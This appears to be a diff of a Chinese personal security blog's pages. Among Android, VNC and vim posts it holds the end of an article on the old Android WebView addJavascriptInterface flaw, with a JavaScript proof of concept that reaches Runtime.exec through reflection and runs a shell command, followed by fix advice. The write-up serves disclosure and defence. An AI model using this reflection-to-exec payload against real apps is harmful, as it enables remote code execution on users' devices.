-<h2 id="☆-漏洞利用的方法"><a href="#☆-漏洞利用的方法" class="headerlink" title="☆ 漏洞利用的方法"></a>☆ 漏洞利用的方法</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params">cmd</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">return</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">jsinterface</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getMethod</span>(<span class="string">&#x27;getRuntime&#x27;</span>,<span class="literal">null</span>).<span class="title function_">invoke</span>(<span class="literal">null</span>,<span class="literal">null</span>).<span class="title function_">exec</span>(cmd);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">execute</span>([<span class="string">&#x27;/system/bin/sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;echo \&quot;mwr\&quot; &gt; /mnt/sdcard/mwr.txt&#x27;</span>]);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>   jsinterface是导出的Java对象， 测试成功，权限是app 的用户权限。</p>
-<h2 id="☆-修复方法和现状"><a href="#☆-修复方法和现状" class="headerlink" title="☆ 修复方法和现状"></a>☆ 修复方法和现状</h2><p>   Google宣布不为小于Android 4.4 的系统提供WebView补丁, 具体可以参见链接：</p>
-<p><a target="_blank" rel="noopener" href="https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior">https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior</a></p>
-<p>   要解决WebView的RCE漏洞，比较靠谱的方法是升级Android系统，至少要升级到<br>   API level 17 (Android 4.2), WebView 除了最严重的RCE漏洞，还有各种SOP漏洞，所<br>   以至少要升级到Android 4.4才能保证安全，小于Android 4.4 Google不提供补丁。<br>   Android 4.4 以后使用以chrome为基础的WebView。</p>
-<p>   升级系统API level 17后，只有显示添加 @JavascriptInterface的方法才能被JavaScript<br>   调用，这样反射就失去作用了。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">removeJavascriptInterface(<span class="string">&quot;accessibility&quot;</span>);</span><br><span class="line">removeJavascriptInterface(<span class="string">&quot;accessibilityTraversal&quot;</span>);</span><br><span class="line">removeJavascriptInterface(<span class="string">&quot;searchBoxJavaBridge_&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="☆-参考链接"><a href="#☆-参考链接" class="headerlink" title="☆ 参考链接"></a>☆ 参考链接</h2><ul>
-<li><a target="_blank" rel="noopener" href="http://developer.android.com/guide/webapps/webview.html">http://developer.android.com/guide/webapps/webview.html</a></li>
-<li><a target="_blank" rel="noopener" href="http://developer.android.com/reference/android/webkit/WebView.html">http://developer.android.com/reference/android/webkit/WebView.html</a></li>
-<li><a target="_blank" rel="noopener" href="https://daoyuan14.github.io/news/newattackvector.html">https://daoyuan14.github.io/news/newattackvector.html</a></li>
-<li><a target="_blank" rel="noopener" href="http://droidsploit.baidu.com/view/14100201.html">http://droidsploit.baidu.com/view/14100201.html</a></li>
-<li><a target="_blank" rel="noopener" href="http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html">http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html</a></li>
-<li><a target="_blank" rel="noopener" href="http://tutorials.jenkov.com/java-reflection/index.html">http://tutorials.jenkov.com/java-reflection/index.html</a></li>
-<li><a target="_blank" rel="noopener" href="http://javaxden.blogspot.sg/2007/08/hack-any-java-class-using-reflection.html">http://javaxden.blogspot.sg/2007/08/hack-any-java-class-using-reflection.html</a></li>
-<li><a target="_blank" rel="noopener" href="http://www.programcreek.com/2013/09/java-reflection-tutorial/">http://www.programcreek.com/2013/09/java-reflection-tutorial/</a></li>
-<li><a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/">https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/</a></li>
-<li><a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/">https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/</a></li>
-</ul>
-<h2 id="☆-思考"><a href="#☆-思考" class="headerlink" title="☆ 思考"></a>☆ 思考</h2><p>   WebView 中还提供了一个方法让我们可以获得控制的机会</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (url.substring(<span class="number">0</span>,<span class="number">6</span>).equalsIgnoreCase(<span class="string">&quot;yourscheme:&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// parse the URL object and execute functions</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>   如果使用上面的代码，在网页的javascript中添加下面的代码，就可以进入后面的解析<br>   URL流程，如果后续代码没有进行严格的检查可能会有一些其他的安全问题。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = <span class="attr">yourscheme</span>:<span class="comment">//method?parameter=value</span></span><br></pre></td></tr></table></figure>
-
-
-<p>Google对这个方法的解释如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Give the host application a chance to take over the control when a new url </span><br><span class="line">is about to be loaded in the current WebView. If WebViewClient is not </span><br><span class="line">provided, by default WebView will ask Activity Manager to choose the proper </span><br><span class="line">handler for the url. If WebViewClient is provided, return true means the </span><br><span class="line">host application handles the url, while return false means the current </span><br><span class="line">WebView handles the url. This method is not called for requests using </span><br><span class="line">the POST &quot;method&quot;.</span><br></pre></td></tr></table></figure>
-
-<p>其实就是当WebView加载新的URL时给App程序一个控制的机会，这还是有一些想象空间的。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/vnc/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/vnc/" class="post-title-link" itemprop="url">Fedora 安装 vnc server</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>因为疫情，现在公司启用远程办公了，不得已在工作机上开了vncserver，这篇文档做个记录。</p>
-<h2 id="1-安装"><a href="#1-安装" class="headerlink" title="(1) 安装"></a>(1) 安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf install tigervnc-server</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-创建服务"><a href="#2-创建服务" class="headerlink" title="(2) 创建服务"></a>(2) 创建服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /lib/systemd/system/vncserver@.service /etc/systemd/system/vncserver@.service</span><br></pre></td></tr></table></figure>
-
-<p>编辑 &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;vncserver@.service 替换下面两行的USER为实际用户名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ExecStart=/sbin/runuser -l USER -c &quot;/usr/bin/vncserver %i -geometry 1280x1024&quot;</span><br><span class="line">PIDFile=/home/USER/.vnc/%H%i.pid</span><br></pre></td></tr></table></figure>
-
-<p>执行命令 <code>systemctl daemon-reload</code></p>
-<p>使用vpnpasswd修改密码</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~]<span class="comment"># su - USER</span></span><br><span class="line">~]$ vncpasswd</span><br><span class="line">Password:</span><br><span class="line">Verify:</span><br></pre></td></tr></table></figure>
-
-<p>启动vncserver的命令行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start vncserver@:1</span><br></pre></td></tr></table></figure>
-
-<p>参考文档：</p>
-<p><a target="_blank" rel="noopener" href="https://docs.fedoraproject.org/en-US/Fedora/21/html/System_Administrators_Guide/ch-TigerVNC.html">https://docs.fedoraproject.org/en-US/Fedora/21/html/System_Administrators_Guide/ch-TigerVNC.html</a></p>
-<h2 id="3-直接调用命令行"><a href="#3-直接调用命令行" class="headerlink" title="(3)直接调用命令行"></a>(3)直接调用命令行</h2><p>使用上面的方法过于繁琐，可以直接调用 vncserver 的命令行</p>
-<p><code>vncserver :2 -geometry 1920x1080 -depth 24</code></p>
-<h2 id="4-改变vnc的默认桌面"><a href="#4-改变vnc的默认桌面" class="headerlink" title="(4) 改变vnc的默认桌面"></a>(4) 改变vnc的默认桌面</h2><p>vim ~&#x2F;.vnc&#x2F;xstartup</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> SESSION_MANAGER</span><br><span class="line"><span class="built_in">unset</span> DBUS_SESSION_BUS_ADDRESS</span><br><span class="line"><span class="comment">#exec /etc/X11/xinit/xinitrc</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> /bin/sh /etc/xdg/xfce4/xinitrc</span><br></pre></td></tr></table></figure>
-
-<p>必须改变默认桌面，要不可能登录不进去。</p>
-<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>个人觉得从安全角度看，使用命令启用 vncserver 是比较合理的，要用了就打开，用完就关。另外vncserver 连接加了一层 tunnel，安全无小事。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/vim_special_char/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/vim_special_char/" class="post-title-link" itemprop="url">vim 输入特殊字符</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-09-06 11:00:51" itemprop="dateCreated datePublished" datetime="2023-09-06T11:00:51+08:00">2023-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>vim 的编辑能力确实很强，今天说一下如何在vim中输入特殊字符，比如音标、unicode 字符。</p>
-<p><a target="_blank" rel="noopener" href="http://vimhelp.appspot.com/digraph.txt.html">http://vimhelp.appspot.com/digraph.txt.html</a><br><a target="_blank" rel="noopener" href="http://vimhelp.appspot.com/insert.txt.html#i_CTRL-V_digit">http://vimhelp.appspot.com/insert.txt.html#i_CTRL-V_digit</a></p>
-<p>关键就在上面两篇，可能许多人不喜欢看复杂的文章，我这里简单介绍一下用法。</p>
-<p>输入音标 ə</p>
-<p>i 进入编辑模式    CTRL-vu0259<br>那如何知道 ə 的 unicode hex number 是 0259呢，在vim的normal 模式下，将光标移动到ə输入ga</p>
-<p>输入 ⇒</p>
-<p>i 进入编辑模式   CTRL-k&#x3D;&gt;<br>:dig 可以看到支持这种方法输入的unicode 字符</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
-
-</div>
-  </main>
-
-  <footer class="footer">
-    <div class="footer-inner">
-
-  <div class="copyright">
-    &copy; 
-    <span itemprop="copyrightYear">2023</span>
-    <span class="with-love">
-      <i class="fa fa-heart"></i>
-    </span>
-    <span class="author" itemprop="copyrightHolder">henices</span>
-  </div>
-
-    </div>
-  </footer>
-
-  
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
-  <div class="sidebar-dimmer"></div>
-  <div class="back-to-top" role="button" aria-label="Back to top">
-    <i class="fa fa-arrow-up fa-lg"></i>
-    <span>0%</span>
-  </div>
-
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
-
-
-  
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
-
-  
-
-
-
-
-
-
-  
-
-
-
-
-
-</body>
-</html>
+主要gclient sync 同步时需要翻墙，可以简单的使用环境变量的方法。
+https_proxy=http://localhost:8118 gclient sync 下载 download google  ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/en/learn_in_public/" title="Learn In Public 摘要">Learn In Public 摘要</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-11-01T15:05:19.059Z" title="Created 2023-11-01 23:05:19">2023-11-01</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PKM/">PKM</a></span></div><div class="content">a habit of creating learning exhaust  
+
+Write blogs and tutorials and cheatsheets.  
+Speak at meetups and conferences.  
+Ask and answer things on Stackoverflow or Reddit.  
+Avoid the walled gardens like Slack and Discord, they’re not public.
+
+
+Make Youtube videos or Twitch streams.  
+Start a newsletter.  
+Draw cartoons (people loooove cartoons!)
+
+Whatever your thing is, make the thing you wish you had found when you were learning.  
+
+Don’t judge your results by “claps” or retweets or stars or up ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/tulading/" title="图拉鼎谈独立开发">图拉鼎谈独立开发</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-10-31T16:00:00.000Z" title="Created 2023-11-01 00:00:00">2023-11-01</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Programming/">Programming</a></span></div><div class="content">独立开发
+
+长期维护产品：消费者愿意为长期维护的产品买单，旧产品没有添加新功能也用新工具链重新编译一次
+只开发自己使用的产品：评估未来几年自己是否使用产品，作为是否启动产品开发的重要因素
+外包 + 独立开发 双驱动
+用外包的收入平滑独立开发的收入波动
+在产品开发瓶颈期，利用外包刺激，打开思路
+
+
+
+项目管理
+
+立项流程: 先记下 idea，冷却一段时间后如果有思路就继续完善一下 idea，直到某天还是想做，接着就开始动手
+没有市场分析，没有用户分析，只有分阶段完成的 1.0、2.0 … 版本
+1.0 版本为自己开发，只开发最核心的功能，2-n 通过用户的反馈完善产品
+
+工作模式
+
+充分利用灵活性，在家和在外工作的时间大致是 2:1
+定期与设计师碰头，每周2-3 次
+
+状态管理
+
+有多少状态做多少事，即使状态不太好，也需要做事。
+外部环境对状态有影响，可以利用图书馆等场所，将自己带入状态。
+
+时间管理（自律）
+
+曾经经历工作混乱的时期，现在严格工作时间登记，自己开发系统完成工作时间登记。
+自律还包括定期 Review (日报、周报)，计划管理，保持自己的开发节奏。
+工作日基本都工作和上班 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/youyuxi/" title="尤雨溪谈成功和运气">尤雨溪谈成功和运气</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-10-31T16:00:00.000Z" title="Created 2023-11-01 00:00:00">2023-11-01</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Programming/">Programming</a></span></div><div class="content">1）运气很重要，时势造英雄在适当的时间节点上推出合适的产品能大幅提高成功的概率2）真正的关键点，不在写程序上重要的是判断需求，制定合适的技术方案去满足客户的需求3）成功需要市场直觉和产品上的判断力4）光有能力或者光有运气都很难成功运气是客观存在的，But there’s nothing we can do about it.5）我们只能提高自己能力，多尝试，每次尝试运气都不一样6）独立开发重要的不是技术的优劣，而是如何开发一个产品的问题
+
+如何快速匹配市场需求
+如何识别目标客户
+如何快速验证商业模式
+如何快速推向市场。
+考验的是运营能力、合理分配资源的能力，简化创业流程的能力
+
+reference: https://pca.st/yjf05b7i
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/qiangliyandu/" title="万维钢的强力研读笔记法">万维钢的强力研读笔记法</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-24T16:00:00.000Z" title="Created 2023-09-25 00:00:00">2023-09-25</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PKM/">PKM</a></span></div><div class="content">清晰表达每一章的逻辑脉络
+
+按照书籍的章节给笔记划分章节，用自己的话写出每一个章节的内容，各章内容串联起来就成了整本书的内容提要
+最重要的是理清作者的逻辑脉络，每一章的逻辑结构可能就几句话，却可能分散在大几十页的内容中
+
+带走书中的所有亮点
+
+读书不是划线式的重点内容总结，而应该注意让你拍案叫绝，点醒梦中人，这些可以刺激改变你的思维的内容
+
+大量自己的看法和心得
+
+强力研读是主动式的读书，你需要写下自己对一段内容或一句话的理解
+你可以质疑或者肯定作者的看法，也可以写下自己阅读时的灵感
+在写读书笔记的过程中，你可能突然解决了一个你以前关注的问题，也可能想到了书中思想一个应用场景
+这些灵感都相当宝贵，转瞬即逝，一定要将把他们记录下来
+
+发现本书和其他书籍文章的联系
+
+极少书的思想是独立与世界的，大多新知识都是建立在旧知识的基础上的
+同一问题，不同书籍的作者的看法有什么不同之处，有没有新的论据支持或者反对他们的看法
+
+好书需要至少阅读两遍
+
+第一遍是为了陷进去，第二遍是为了跳出来
+第一遍阅读可能对领域内容不太熟悉，全部带宽都要用于理解作者的思想。
+想法只有在带宽剩余时，才可能冒出来。为了最有 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/living_younger_healthier_logger/" title="端粒效应">端粒效应</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-12T16:00:00.000Z" title="Created 2023-09-13 00:00:00">2023-09-13</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Life/">Life</a></span></div><div class="content">获得 2009 年诺贝尔生理或医学奖的 伊丽莎白·布莱克本在 《端粒效应》一书中说明：人只所以变老，是由于某些细胞不再更新了，而细胞分裂更新的限制在于 “端粒”。
+端粒是染色体末端的 DNA 序列，在细胞分裂过程中，端粒起到保护 DNA 序列的作用。所以，人之所变老的本质原因是 「端粒变短」。
+影响端粒变短的因素
+
+思想压力：研究表明长期照顾患病小孩的母亲，端粒长度较正常人变短
+敌意：看哪儿都不对，和周围的人关系极差
+悲观：对事情总有一个负面的预期
+胡思乱想：抑郁，都是乱想负面的东西，觉得不公平对待
+
+缓解负面情绪的方法
+
+把压力视为挑战：对压力的反应是威胁还是挑战，决定压力的性质
+专注力训练：冥想
+找到人生的目标：find something bigger than yourself
+
+锻炼对端粒的好处
+
+人体是反脆弱系统：锻炼的本质是对身体的适度打击
+细胞的反击：适度的锻炼能使端粒变长，并增加「自由基」
+抗氧化剂增多：突然增多的自由基使得身体增加抗氧化剂，锻炼改变了自由基和抗氧化剂的平衡
+锻炼到底是影响端粒还是端粒脢，分子生物学上的机制科学家现在还不知道
+
+两种科学的锻炼方法
+
+有 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/xorddos_hide/" title="xorddos 样本进程隐藏的小伎俩">xorddos 样本进程隐藏的小伎俩</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.915Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Malware/">Malware</a></span></div><div class="content">进程隐藏上周由于工作原因接触到xorddos的样本，这个样本在过去一年的时间里非常常见，变种也很多，拿到的样本比较有趣的是 ps 无法发现进程。
+123456789101112131415161718192021[root@localhost ~]# ps -ef  | grep /usr/bin...root      4597  4594  0 00:37 ?        00:00:00 gnome-pty-helperroot      4598  4594  0 00:37 pts/1    00:00:00 bashoracle    5359     1  0 00:41 ?        00:00:00 ora_smco_orcloracle    5378     1  0 00:41 ?        00:00:00 ora_w000_orcloracle    5586     1  0 00:42 ?        00:00:00 ora_j000_orcloracle    5588     1  0 00:42 ?        00:00:00 o ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/Windows_Rx034/" title="解决 Windows Rx034">解决 Windows Rx034</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.914Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/windows/">windows</a></span></div><div class="content">以前没有遇上这个错误，这次遇上这个错误是装vim的YouCompleteMe插件后出现，因此很容易想到是装插件引起的这个错误，错误提示Runtime Error 如下图：
+
+先放狗搜一下，微软的对R6034的解释如下：
+12345An application has made an attempt to load the C runtime library without usinga manifest. This is an unsupported way to load Visual C++ DLLs. You need tomodify your application to build with a manifest. For more information, see the&quot;Visual C++ Libraries as Shared Side-by-Side Assemblies&quot; topic in the productdocumentation.
+
+微软的链接中也提到了解决的方法
+123456Rebuild your application to  ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/webview_java/" title="Android WebView 漏洞">Android WebView 漏洞</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.896Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Security/">Security</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/Android/">Android</a></span></div><div class="content">☆ 来自 developer.android.com 的信息Android 官方网站对addJavascriptInterface的介绍如下：
+123456789101112public void addJavascriptInterface (Object object, String name)  Added in API level 1Injects the supplied Java object into this WebView. The object is injected intothe JavaScript context of the main frame, using the supplied name. This allows the Java object&#x27;s methods to be accessed from JavaScript. For applicationstargeted to API level JELLY_BEAN_MR1 and above, only public methods that are annotated with ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/vnc/" title="Fedora 安装 vnc server">Fedora 安装 vnc server</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.882Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/linux/">linux</a></span></div><div class="content">因为疫情，现在公司启用远程办公了，不得已在工作机上开了vncserver，这篇文档做个记录。
+(1) 安装1sudo dnf install tigervnc-server
+
+(2) 创建服务1cp /lib/systemd/system/vncserver@.service /etc/systemd/system/vncserver@.service
+
+编辑 &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;vncserver@.service 替换下面两行的USER为实际用户名
+12ExecStart=/sbin/runuser -l USER -c &quot;/usr/bin/vncserver %i -geometry 1280x1024&quot;PIDFile=/home/USER/.vnc/%H%i.pid
+
+执行命令 systemctl daemon-reload
+使用vpnpasswd修改密码
+1234~]# su - USER~]$ vncpasswdPassword:Verify:
+
+启动vncserver的命令行
+1sudo sy ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/#content-inner">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/#content-inner">11</a><a class="extend next" rel="next" href="/page/2/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">henices</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">102</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a></div></div><!--    a(href=url_for(config.category_dir) + '/')--><!--      .headline= _p('aside.categories') --><!--      .length-num= site.categories.lengthif theme.aside.card_author.button.enable
+  a#card-info-btn(href=theme.aside.card_author.button.link)
+    i(class=theme.aside.card_author.button.icon)
+    span=theme.aside.card_author.button.text
+
+if(theme.social)
+    .card-info-social-icons.is-center
+      !=partial('includes/header/social', {}, {cache: true})--><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/pdfium-fuzz.public/" title="使用 afl-fuzz fuzz pdfium">使用 afl-fuzz fuzz pdfium</a><time datetime="2023-11-06T05:52:04.969Z" title="Created 2023-11-06 13:52:04">2023-11-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/en/learn_in_public/" title="Learn In Public 摘要">Learn In Public 摘要</a><time datetime="2023-11-01T15:05:19.059Z" title="Created 2023-11-01 23:05:19">2023-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/tulading/" title="图拉鼎谈独立开发">图拉鼎谈独立开发</a><time datetime="2023-10-31T16:00:00.000Z" title="Created 2023-11-01 